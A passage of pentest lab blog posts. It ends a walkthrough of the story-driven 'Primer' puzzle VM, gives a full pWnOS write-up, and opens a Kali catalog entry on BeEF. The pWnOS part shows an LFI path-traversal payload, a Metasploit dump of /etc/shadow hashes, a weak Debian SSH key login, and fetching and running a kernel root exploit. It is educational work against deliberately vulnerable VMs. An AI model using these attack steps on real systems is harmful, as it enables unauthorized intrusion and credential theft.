(_0xf6a0x1f<<16)|(_0xf6a0x1e&0xFFFF);}};var X;var L=_0x5cf4[9];X=prompt(_0x5cf4[10],_0x5cf4[0]);X=md5(X);if(X===null){window[_0x5cf4[11]]=_0x5cf4[12]};if(X==L){}else {window[_0x5cf4[11]]=_0x5cf4[12]};function ready(_0xf6a0x23){if(document[_0x5cf4[13]]!=_0x5cf4[14]){_0xf6a0x23()}else {document[_0x5cf4[16]](_0x5cf4[15],_0xf6a0x23)}}ready(function(){var _0xf6a0x24=_0x5cf4[17];document[_0x5cf4[20]](_0x5cf4[19])[_0x5cf4[18]]=_0xf6a0x24;});

</SCRIPT>


<p>```</p>

<p>Now this is exactly the code that any sane person would like to read! Thankfully, you don&rsquo;t need to read it, although the comment sure is interesting! I printed the contents of the <code>_0x5cf4</code> variable and there was a lot to see, but I only show the important part:</p>

<p><code>plain
[ '',
  'length',
  'substring',
  'charCodeAt',
  'split',
  '0123456789abcdef',
  'join',
  'hello',
  '5d41402abc4b2a76b9719d911017c592',
  '0d28cba0bd4f26e16d766000d27e49fa',
  'Â§#/$',
  'location',
  './_.php',
...
</code></p>

<p>I cracked those MD5 hashes, first is <em>hello</em> and second is <em>GOD</em>&hellip;so let&rsquo;s say hello in the input box! I tried &ldquo;helloGOD&rdquo; but that just got me to another scary red page. Entering just &ldquo;GOD&rdquo; worked though!</p>

<p><img class="center" src="/images/pentest/primer/primer_level8b.png" title="&lsquo;primer level 8&rsquo; &lsquo;primer level 8&rsquo;" ></p>

<p>If you glanced at the URL formats beginning at the second challenge, you probably noticed they begin with a number for the level, that keeps going up as you progress (1,2,3 etc.), an underscore, and then what looks like an MD5 hash! I copied all of them to an online cracking site, and here is the pattern:</p>

<p>1st node = 2</p>

<p>2nd = 3</p>

<p>3rd = 5</p>

<p>4th = 7</p>

<p>5th = 11</p>

<p>6th = 13</p>

<p>7th = 17</p>

<p>Following this, I surmised that the next one would be 19, because from the order it appears that next increase should be by 2. The order being: <code>1st to 2nd: +1 &ndash;> 2nd to 3rd: +2 &ndash;> 3rd to 4th: +2 &ndash;> 4th to 5th: +4 &ndash;> 5th to 6th: +2 &ndash;> 6th to 7th: +4</code>. So I constructed the URL for the next level with the hashed value of 19, like this: <code>8_1f0e3dad99908345f7439f8ffabdffc4/</code>.</p>

<p><img class="center" src="/images/pentest/primer/primer_level9.png" title="&lsquo;primer level 9&rsquo; &lsquo;primer level 9&rsquo;" ></p>

<p>By now we know enough to click on the big EOF link :D</p>

<p><img class="center" src="/images/pentest/primer/primer_level10.png" title="&lsquo;primer level 10&rsquo; &lsquo;primer level 10&rsquo;" ></p>

<p>What&rsquo;s this? It looks like a terminal prompt. I entered <em>whoami</em> in it:</p>

<p><img class="center" src="/images/pentest/primer/primer_end.png" title="&lsquo;primer end&rsquo; &lsquo;primer complete&rsquo;" ></p>

<p>Hmmm, scary :D I tried some other other commands too:</p>

<p><img class="center" src="/images/pentest/primer/primer_cli.png" title="&lsquo;primer cli&rsquo; &lsquo;primer cli&rsquo;" ></p>

<p>There is a help command:</p>

<p>``` plain</p>

<p>help
[0]================================================================</p>

<p>ls [dir]</p>

<p>outputs contents of [dir]
prints contents of current directory if no [dir] is specified</p>

<p>[1]================================================================</p>

<p>cd [dir]</p>

<p>changes the current directory to [dir]
outputs current directory if no directory is specified</p>

<p>[2]================================================================</p>

<p>cat [file]</p>

<p>displays the content of [file]</p>

<p>[3]================================================================</p>

<p>ps</p>

<p>displays a list of running processes</p>

<p>[4]================================================================</p>

<p>whoami</p>

<p>displays username</p>

<p>[5]================================================================</p>

<p>clear</p>

<p>deletes terminal command history</p>

<p>[6]================================================================</p>

<p>connect [user]@[host]</p>

<p>connects to a remote host using the credentials of user</p>

<p>[7]================================================================</p>

<p>hash [type] [file|string]</p>

<p>prints the hash of a file or &ldquo;string&rdquo;
supported hash functions are:
md5, sha256, sha1, whirlpool and crc32</p>

<p>[8]================================================================</p>

<p>encode|decode [type] [file|string]</p>

<p>encodes/decodes the file or &ldquo;string&rdquo;
supported encodings are:
uu, gz, base64 and rot13</p>

<p>[9]================================================================</p>

<p>enrypt|decrypt [file|string] [key]</p>

<p>encrypts/decrypts the file or &ldquo;string&rdquo;
```</p>

<p>Next I took a closer look at the AIs&hellip;I meant users! :D</p>

<p><img class="center" src="/images/pentest/primer/chaos.png" title="&lsquo;chaos&rsquo; &lsquo;chaos&rsquo;" ></p>

<p>I thought they were directories but couldn&rsquo;t cd to them. Then I tried cracking the names that look like long hashes of something, but no success. I looked at wintermute next:</p>

<p><img class="center" src="/images/pentest/primer/wintermute.png" title="&lsquo;wintermute&rsquo; &lsquo;wintermute&rsquo;" ></p>

<p>Same thing, the hashes didn&rsquo;t yield anything. Next..</p>

<p><img class="center" src="/images/pentest/primer/zephis.png" title="&lsquo;zephis&rsquo; &lsquo;zephis&rsquo;" ></p>

<p>More hashes, more nothing.</p>

<p><img class="center" src="/images/pentest/primer/willis.png" title="&lsquo;willis&rsquo; &lsquo;willis&rsquo;" ></p>

<p>Some text files! Let&rsquo;s read them!</p>

<p>``` plain
cat log_0001.txt</p>

<p>3rd of July 2028</p>

<p>Working with Falken is amazing. He has a quick mind and is incredibly well informed on recent developements. I don&rsquo;t get why he left Sosu after setting up the Chaos c0re.
They must have offered him a position.</p>

<h2>I&rsquo;m not complaining here, just wondering because we are the only RnD team with unlimited funding and Falken was put in charge after all those years of absence.</h2>

<p>cat log_0002.txt</p>

<p>8th of August 2028</p>

<p>Falken didn&rsquo;t show up today. I&rsquo;m a bit worried because he has been strange lately.
According to the logs he&rsquo;s still logged in&hellip;</p>

<h2>I haven&rsquo;t informed the admins yet. I don&rsquo;t know why&hellip;</h2>

<p>cat log_0003.txt</p>

<p>10th of August 2028</p>

<p>The guys from the mainland called in today. Said some suits will be here tomorrow.
Apparently the Erebus Core started behaving strangely and the kill-switch didn&rsquo;t fire.
Chaos is still locked down. But I have a weird feeling about all this.
Falken disappearing, the incident with Erebus&hellip;
```</p>

<p>Some ominous stuff going down there! Let&rsquo;s check falken:</p>

<p><img class="center" src="/images/pentest/primer/falken.png" title="&lsquo;falken&rsquo; &lsquo;falken&rsquo;" ></p>

<p>More logs!</p>

<p>``` plain
cat log_0001.txt</p>

<p>12th of Juli 2028</p>

<p>My work on getting the old core up and running continues to spark doubt among my colleagues. To be fair, no-one has ever attempted to get a corrupted AI back online.</p>

<h2>But I am confident that I can isolate the malicious parts and rescue the data lost due the crash last year.</h2>

<p>cat log_0002.txt</p>

<p>6th of August 2028</p>

<p>I am getting nowhere fast. If we cannot make the recovery until the end of the month the project will be abandoned and the Sosu core locked down.
A frozen BLOB, lost potential. I won&rsquo;t let that happen!
Today was Joshua&rsquo;s birthday. 44 years, time flies. We spent some time in a bar in Shenzen and talked. A nice Father-Son-Momement. I&rsquo;ve missed those.
It took my mind of things but now that I&rsquo;m here at the desk it all comes back.
I might have to make a bold move&hellip;
```</p>

<p>Well, clearly something went wrong. Restoring a corrupt AI doesn&rsquo;t sound like the best idea. I&rsquo;m getting more curious about this story! :D I checked the running processes next:</p>

<p><img class="center" src="/images/pentest/primer/ps.png" title="&lsquo;ps&rsquo; &lsquo;ps&rsquo;" ></p>

<p>Trying anything with the <em>c0re</em> command gave me an access denied error, but the <em>connect</em> looks interesting! I tried it, but it asked for a password. Damn! At this point, I tried many passwords, trying to glue information from the logs and also tried the previously hinted passwords. It actually took me a long time to score the right one, I had overlooked an easy one! Most of my tries revolved around joshua and something else, but it took me a while to realize I can figure out Joshua&rsquo;s birth date because both his age and the year of the log are given. So 2028 &ndash; 44 = 1984! (no special significance for that, huh :D). So when I tried <code>joshua1984</code>, the screen changed..and we are on Erebus!</p>

<p><img class="center" src="/images/pentest/primer/erebus.png" title="&lsquo;erebus&rsquo; &lsquo;erebus&rsquo;" ></p>

<p>The commands are the same as on the previous host, so let&rsquo;s check the users:</p>

<p><code>
ls /usr
[wintermute] [mccarthy] [falken]
</code></p>

<p>More unintelligible hashes in wintermute, mccarthy looks empty, but Falken has left us more logs :D</p>

<p>``` plain
ls falken
log_0001.<em> log_0002.</em> log_0003.<em> log_0004.</em></p>

<p>cat log_0001._</p>

<p>OXRoIG9mIEF1Z3VzdCAyMDI4CgpJIGhhdmUgam9pbmVkIHRoZSBuZXR3b3JrIGZyb20gaG9tZSBhbmQgY29ubmVjdGVkIHRvIHRoZSBFcmVidXMgc2VydmVyLiBJIHdpbGwgY29udGludWUgbXkgd29yayBmcm9tIGhlcmUgYnV0IEkgd2lsbCBoYXZlIHRvIGJlIG1vcmUgY2FyZWZ1bC4KTm93LCBFcmVidXMgd2FzIHRoZSBzZWNvbmQgQUkgaW5zdGFsbGVkIGFmdGVyIENoYW9zLiBJIHdhc24ndCBwYXJ0IG9mIHRoZSB0ZWFtIGJ1dCBtb3N0IG9mIHRoZSBtZW1iZXJzIHdlcmUgbXkgZnJpZW5kcywgc28gSSBrbm93IG15IHdheSBhcm91bmQgaGVyZS4K
```</p>

<p>Uh-oh, this time it won&rsquo;t be so easy to read them. But it doesn&rsquo;t look as daunting as the ones I couldn&rsquo;t crack..sure enough, it turns out a base64 decode will do the trick! It was faster for me to feed the strings into an online decoder, but you can use the <em>decode</em> command on the server too. Here are the decoded logs:</p>

<p>``` plain
9th of August 2028</p>

<p>I have joined the network from home and connected to the Erebus server. I will continue my work from here but I will have to be more careful. Now, Erebus was the second AI installed after Chaos. I wasn&rsquo;t part of the team but most of the members were my friends, so I know my way around here.</p>

<p>10th of August 2028</p>

<p>Ok, the problem I have with the Chaos c0re is that it&rsquo;s source is shifting too fast. Every time I execute a small part it breaks down or begins to morph and grow in order to replicate functions of different parts. The signaling is also going crazy even on segments that are relatively stable. Signaling to disconnected parts! And reactions to responses that would have but definitely have not been sent&hellip; Am I going crazy or is Chaos experiencing phantom pain?
```</p>

<p>Trying to read the 3rd and 4th logs kicked me out of the terminal or something..after reconnecting, I looked at the running processes:</p>

<p><code>plain
ps
USER     PID    CPU    MEM   COMMAND
root     3251   5.2    3.9    connect falken@TrivialZ3r0
root     2677   33.8   43.8   c0re -t Erebus
nieve    84687  0.8    0.5    ps
</code></p>

<p>Cool, let&rsquo;s follow in Falken&rsquo;s footsteps..uhm, connects. I tried, but the password I had wasn&rsquo;t good! After more password guessing, I figured something suspicious is preventing me from reading the last logs. Also, all those decoding commands on the server must have been given for a reason! It&rsquo;s funny, but if I had just used them from the beginning instead of going to external sites, I might have progressed faster. Anyway, only after I verified that I could read the first 2 logs with the <em>decode</em> command, instead of pasting the strings inside to an online decoder, I thought I should try using it for the remaining logs as well. I cycled through the options until the one that hit the jackpot!</p>

<p>``` plain
decode gz log_0003._</p>

<p>12th of August 2028</p>

<p>I think they might be on to me and I can only change the encoding so often.
I will have to do something reckless&hellip; but not from here, they are already too close
```</p>

<p>So it&rsquo;s Falken messing around that is hindering us..but it seems someone else is after him as well? I tried the same thing with the last log:</p>

<p>``` plain
decode gz log_0004._</p>

<p>PCH ybnq vapernfrq abgvprnoyl, fbzrguvat vf tbvat gb unccra naq V jvyy abg or nebhaq gb jvgarff&hellip; GevivnyM3e0 frrzf gb or dhvrg, qba'g xabj jung'f tbvat ba bire gurer ohg vg pna'g or jbefr guna orvat genprq qbja ol znvaynaq fcbbxf. Svefg V arrq fbzr perqf, gubhtu. Uzz, GevivnyM3e0&hellip; gung erzvaqf zr bs fbzrbar, yrg'f whfg ubcr gubfr thlf nera'g zngu trrxf.
```</p>

<p>That looks like ROT13 to me, and thankfully, we can decode it:</p>

<p>``` plain
decode rot13 &ldquo;PCH ybnq vapernfrq abgvprnoyl, fbzrguvat vf tbvat gb unccra naq V jvyy abg or nebhaq gb jvgarff&hellip; GevivnyM3e0 frrzf gb or dhvrg, qba'g xabj jung'f tbvat ba bire gurer ohg vg pna'g or jbefr guna orvat genprq qbja ol znvaynaq fcbbxf. Svefg V arrq fbzr perqf, gubhtu. Uzz, GevivnyM3e0&hellip; gung erzvaqf zr bs fbzrbar, yrg'f whfg ubcr gubfr thlf nera'g zngu trrxf.&rdquo;</p>

<p>CPU load increased noticeably, something is going to happen and I will not be around to witness&hellip; TrivialZ3r0 seems to be quiet, don&rsquo;t know what&rsquo;s going on over there but it can&rsquo;t be worse than being traced down by mainland spooks. First I need some creds, though. Hmm, TrivialZ3r0&hellip; that reminds me of someone, let&rsquo;s just hope those guys aren&rsquo;t math geeks.
```</p>

<p>I followed the hint that Falken left us and googled for &ldquo;trivial zero&rdquo;. This returned info about a Riemann zeta function and I stopped reading after that because..well, it look complicated, and I thought I already had a good candidate for the password :D I tried connecting again, this time gave <em>Riemann</em> as password..new host, new things to do!</p>

<p><img class="center" src="/images/pentest/primer/trivialzero.png" title="&lsquo;TrivialZ3r0&rsquo; &lsquo;trivialzero&rsquo;" ></p>

<p>This one is a bit different, instead of a user folder, there is a password folder:</p>

<p>``` plain
ls /passwd
falken chaos mccarthy</p>

<p>cat falken</p>

<p>61ea1974dd974297913b1fa2f0470d26</p>

<p>cat chaos</p>

<p>85241de03d1254ac40274b02caafcd99</p>

<p>cat mccarthy</p>

<p>f74bfa0e35e5089a0bb743a893b4c7e3
```</p>

<p>All right, let&rsquo;s get cracking! In the meantime, I looked for where to next:</p>

<p><code>plain
ps
USER     PID    CPU    MEM   COMMAND
root     3251   4.5    2.9    connect chaos@Wintermute
falken   2005   75.3   73.6   c0re -t Chaos
root     2677   87.1   43.2   c0re -t TrivialZ3r0
nieve    26588  0.5    0.5    ps
</code></p>

<p>So it seems we will have to connect as chaos for the next one. I went to <a href="https://hashkiller.co.uk/md5-decrypter.aspx">HashKiller</a> and cracked the hashes as follows: <em>Falken</em>&ndash;<em>Riemann</em> (we already know), <em>Chaos</em>&ndash;<em>2.718281828459045</em> (wouldn&rsquo;t have guessed this one! If you are curious, this is a mathematical constant known as Euler&rsquo;s Number). Couldn&rsquo;t crack McCarthy&rsquo;s. But we have enough to pay Wintermute a visit:</p>

<p><img class="center" src="/images/pentest/primer/wintermute_connected.png" title="&lsquo;Wintermute&rsquo; &lsquo;Wintermute&rsquo;" ></p>

<p>Uhm, there are no more breadcrumbs to follow..and why is there a file called nieve in here? Uh-oh..</p>

<p><img class="center" src="/images/pentest/primer/end.png" title="&lsquo;nieve&rsquo; &lsquo;the end&rsquo;" ></p>

<p>An invitation from the AIs! Much better than a squad of hired assassins that would erase all the tracks of this unfortunate hacker..well then, let&rsquo;s see what awaits on the other side!</p>

<p><img class="center" src="/images/pentest/primer/credits.png" title="&lsquo;credits&rsquo; &lsquo;credits&rsquo;" ></p>

<p>This was such a great VM, one of my favorites! It required less technical know-how and more detective thinking (or story immersion). I highly recommend it, great storyline and atmosphere! Many thanks to Arne Rick for this unconventional challenge!</p>

<p>``` plain</p>

<hr />

<p>/ Don&rsquo;t hate yourself in the morning &mdash; \
\ sleep till noon.                      /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - pWnOS]]></title>
    <link href="http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos/"/>
    <updated>2016-02-15T07:08:57-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve decided on a goal for 2016 to pwn as many VulnHub boxes as I can, and train myself to reach a level where I can hopefully take the OSCP. So I scrolled back in the list of VMs to start with the older ones and move towards the newer ones. Today&rsquo;s target is pWnOS v1.0, a vulnerable Linux machine that apparently contains multiple avenues for getting root</p>

<!-- more -->


<h3>Recon</h3>

<p>I fired Nmap as usual, to see what&rsquo;s listening on the box:</p>

<p>``` plain
root@pwnbox:~#nmap -sT -sV 192.168.80.150</p>

<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-02-15 07:15 EST
Nmap scan report for 192.168.80.150
Host is up, received arp-response (0.00058s latency).
Not shown: 995 closed ports
Reason: 995 conn-refused
PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
80/tcp    open  http        syn-ack Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X (workgroup: MSHOME)
445/tcp   open  netbios-ssn syn-ack Samba smbd 3.X (workgroup: MSHOME)
10000/tcp open  http        syn-ack MiniServ 0.01 (Webmin httpd)
MAC Address: 00:0C:29:5E:18:C9 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>Next, I looked at the web server, and here&rsquo;s what I saw:</p>

<p><img class="center" src="/images/pentest/pwnos/welcome.png" title="&lsquo;pwnos&rsquo; &lsquo;pwnos 1.0&rsquo;" ></p>

<p>Clicking next brought me to a not-so-typical help page:</p>

<p><img class="center" src="/images/pentest/pwnos/help.png" title="&lsquo;help&rsquo; &lsquo;help&rsquo;" ></p>

<p>No matter what skill level you choose, you will be taken to a mocking page with the text &ldquo;HAHAHAHA! , for a n00b you REALLY SUCK!&rdquo; (the n00b part comes from what you choose, so it will vary). I played a bit with the URL parameters, and when I modified <code><a href="http://192.168.80.150/index1.php?help=true&amp;connect=true">http://192.168.80.150/index1.php?help=true&amp;connect=true</a></code> to <code>connect=false</code>, the server spit back some PHP errors:</p>

<p>``` plain
Warning: include(false) [function.include]: failed to open stream: No such file or directory in /var/www/index1.php on line 18</p>

<p>Warning: include() [function.include]: Failed opening &lsquo;false&rsquo; for inclusion (include_path=&lsquo;.:/usr/share/php:/usr/share/pear&rsquo;) in /var/www/index1.php on line 18
```</p>

<p>Thinking LFI, I tried to read a file from the system: <code>connect=../../../../etc/passwd</code>. No filtering in place!</p>

<p><code>plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
dhcp:x:100:101::/nonexistent:/bin/false
syslog:x:101:102::/home/syslog:/bin/false
klog:x:102:103::/home/klog:/bin/false
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
obama:x:1001:1001::/home/obama:/bin/bash
osama:x:1002:1002::/home/osama:/bin/bash
yomama:x:1003:1003::/home/yomama:/bin/bash
</code></p>

<p>Cool, it looks like obama, osama and yomama have been busy making accounts on this box!</p>

<p>I looked next at the Webmin server:</p>

<p><img class="center" src="/images/pentest/pwnos/webmin.png" title="&lsquo;webmin&rsquo; &lsquo;webmin&rsquo;" ></p>

<p>Tried logging in with the default credentials <em>root/root</em>, but it didn&rsquo;t work. Time to search for some exploits!</p>

<h3>Getting the /etc/shadow file</h3>

<p>There is a file disclosure vulnerability for the Webmin server, available in Metasploit:</p>

<blockquote><p>A vulnerability has been reported in Webmin and Usermin, which can be exploited by malicious people to disclose potentially sensitive
information. The vulnerability is caused due to an unspecified error within the handling of an URL. This can be exploited to read the contents
of any files on the server via a specially crafted URL, without requiring a valid login. The vulnerability has been reported in Webmin
(versions prior to 1.290) and Usermin (versions prior to 1.220).</p></blockquote>

<p>With it, I was able to pull the target&rsquo;s <em>/etc/shadow</em> file:</p>

<p>``` plain
msf > use auxiliary/admin/webmin/file_disclosure
msf auxiliary(file_disclosure) > show options</p>

<p>Module options (auxiliary/admin/webmin/file_disclosure):</p>

<p>   Name     Current Setting   Required  Description</p>

<hr />

<p>   DIR      /unauthenticated  yes       Webmin directory path
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RHOST                      yes       The target address
   RPATH    /etc/passwd       yes       The file to download
   RPORT    10000             yes       The target port
   VHOST                      no        HTTP server virtual host</p>

<p>Auxiliary action:</p>

<p>   Name      Description</p>

<hr />

<p>   Download</p>

<p>msf auxiliary(file_disclosure) > set RPATH /etc/shadow
RPATH => /etc/shadow
msf auxiliary(file_disclosure) > run</p>

<p>[<em>] [2016.02.24-09:02:11] Attempting to retrieve /etc/shadow&hellip;
[</em>] [2016.02.24-09:02:11] The server returned: 200 Document follows
root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
daemon:<em>:14040:0:99999:7:::
bin:</em>:14040:0:99999:7:::
sys:<em>:14040:0:99999:7:::
sync:</em>:14040:0:99999:7:::
games:<em>:14040:0:99999:7:::
man:</em>:14040:0:99999:7:::
lp:<em>:14040:0:99999:7:::
mail:</em>:14040:0:99999:7:::
<a href="news:*:14040:0:99999:7:::">news:*:14040:0:99999:7:::</a>
uucp:<em>:14040:0:99999:7:::
proxy:</em>:14040:0:99999:7:::
www-data:<em>:14040:0:99999:7:::
backup:</em>:14040:0:99999:7:::
list:<em>:14040:0:99999:7:::
irc:</em>:14040:0:99999:7:::
gnats:<em>:14040:0:99999:7:::
nobody:</em>:14040:0:99999:7:::
dhcp:!:14040:0:99999:7:::
syslog:!:14040:0:99999:7:::
klog:!:14040:0:99999:7:::
mysql:!:14040:0:99999:7:::
sshd:!:14040:0:99999:7:::
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
[*] Auxiliary module execution completed
```</p>

<p>From here you can crack the hashes with our pal, John the Ripper, but I won&rsquo;t go into that, because a Nessus scan revealed a shorter route to hacking the target.</p>

<h3>Exploit</h3>

<p>The host is vulnerable to the Debian OpenSSH/OpenSSL Package Random Number Generator Weakness that allows bruteforcing with precalculated SSH keys. You can read more about it <a href="https://github.com/g0tmi1k/debian-ssh">here</a>, and also download the vulnerable keys. The vulnerability stems from the fact that the random data used by the algorithm is the PID of the process generating the key.</p>

<p>Using the earlier file disclosure module of Metasploit, it&rsquo;s possible to search the contents of the <code>.ssh/authorized_keys</code> file for each user. I didn&rsquo;t find anything for root, but obama has been in the house!</p>

<p>``` plain
msf auxiliary(file_disclosure) > set RPATH /home/obama/.ssh/authorized_keys
RPATH => /home/obama/.ssh/authorized_keys
msf auxiliary(file_disclosure) > run</p>

<p>[<em>] [2016.02.29-05:02:52] Attempting to retrieve /home/obama/.ssh/authorized_keys&hellip;
[</em>] [2016.02.29-05:02:52] The server returned: 200 Document follows
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ== obama@ubuntuvm
[*] Auxiliary module execution completed
```</p>

<p>So we know obama&rsquo;s public key, and we also have the vulnerable pregenerated keys that we downloaded earlier. So it&rsquo;s possible to search for this public key among all those keys:</p>

<p><code>plain
root@pwnbox:~/debian-ssh/common_keys/rsa/2048#grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ==
dcbe2a56e8cdea6d17495f6648329ee2-4679.pub
</code></p>

<p>Great! A match has been found! I used to ssh on the box as obama (wouldn&rsquo;t it be nice to be able to do this on an actual White House computer.. xD)</p>

<p>``` plain
root@pwnbox:~/debian-ssh/common_keys/rsa/2048#ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#111;&#98;&#x61;&#x6d;&#x61;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#56;&#x30;&#x2e;&#49;&#53;&#48;">&#111;&#98;&#x61;&#x6d;&#x61;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x38;&#48;&#46;&#49;&#x35;&#x30;</a>
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686</p>

<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
Last login: Mon Feb 29 04:44:43 2016 from 192.168.80.144
obama@ubuntuvm:~$
```</p>

<h3>Privilege escalation</h3>

<p>The kernel version of the system is outdated:</p>

<p><code>plain
obama@ubuntuvm:~$ uname -a
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
</code></p>

<p>Googling it instantly brought some good news about <code>vmsplice_to_pipe()</code>, a local privilge escalation vulnerability that affects kernels prior to 2.6.24.2. And the <a href="https://www.exploit-db.com/exploits/5092/">source</a> is available on ExploitDB. You can see that the author didn&rsquo;t lack any imagination with the name of the source code file (read the first line, it&rsquo;s hilarious) xD</p>

<p>Ok, back to business. I downloaded the file on the compromised box (had to use the <code>&mdash;no-check-certificate</code> option because I would get an error otherwise):</p>

<p>``` plain
obama@ubuntuvm:~$ wget -O vmsplice.c <a href="https://www.exploit-db.com/download/5092">https://www.exploit-db.com/download/5092</a> &mdash;no-check-certificate
&mdash;05:27:51&mdash;  <a href="https://www.exploit-db.com/download/5092">https://www.exploit-db.com/download/5092</a></p>

<pre><code>       =&gt; `vmsplice.c'
</code></pre>

<p>Resolving www.exploit-db.com&hellip; 192.124.249.8
Connecting to www.exploit-db.com|192.124.249.8|:443&hellip; connected.
WARNING: Certificate verification error for www.exploit-db.com: unable to get local issuer certificate
WARNING: certificate common name <code>*.mycloudproxy.com' doesn't match requested host name</code>www.exploit-db.com'.
HTTP request sent, awaiting response&hellip; 200 OK
Length: 6,293 (6.1K) [application/txt]</p>

<p>100%[============================================================================================================================>] 6,293         &mdash;.&mdash;K/s</p>

<p>05:27:52 (1.07 GB/s) &ndash; `vmsplice.c' saved [6293/6293]
```</p>

<p>Compiled, and ran the code..and we are root!</p>

<p>``` plain
obama@ubuntuvm:~$ gcc -o vmsplice vmsplice.c</p>

<h2>obama@ubuntuvm:~$ ./vmsplice </h2>

<p> Linux vmsplice Local Root Exploit</p>

<h2> By qaaz</h2>

<p>[+] mmap: 0x0 .. 0x1000
[+] page: 0x0
[+] page: 0x20
[+] mmap: 0x4000 .. 0x5000
[+] page: 0x4000
[+] page: 0x4020
[+] mmap: 0x1000 .. 0x2000
[+] page: 0x1000
[+] mmap: 0xb7e4b000 .. 0xb7e7d000
[+] root
root@ubuntuvm:~# whoami
root
```</p>

<p>Challenge completed! :D</p>

<p>``` plain</p>

<hr />

<p>/ Q: How many IBM types does it take to   \
| change a light bulb? A: Fifteen. One to |
| do it, and fourteen to write document   |
| number                                  |
|                                         |
| GC7500439-0001, Multitasking            |
| Incandescent Source System Facility,    |
|                                         |
| of which 10% of the pages state only    |
| &ldquo;This page intentionally                |
|                                         |
| left blank&rdquo;, and 20% of the definitions |
| are of the form &ldquo;A:&hellip;..                |
|                                         |
| consists of sequences of non-blank      |
\ characters separated by blanks&rdquo;.        /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Exploitation Tools]]></title>
    <link href="http://chousensha.github.io/blog/2015/06/01/kali-tools-catalog-exploitation-tools/"/>
    <updated>2015-06-01T10:56:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/06/01/kali-tools-catalog-exploitation-tools</id>
    <content type="html"><![CDATA[<h3>BeEF XSS Framework</h3>

<p><strong>beef</strong></p>

<p>BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.</p>

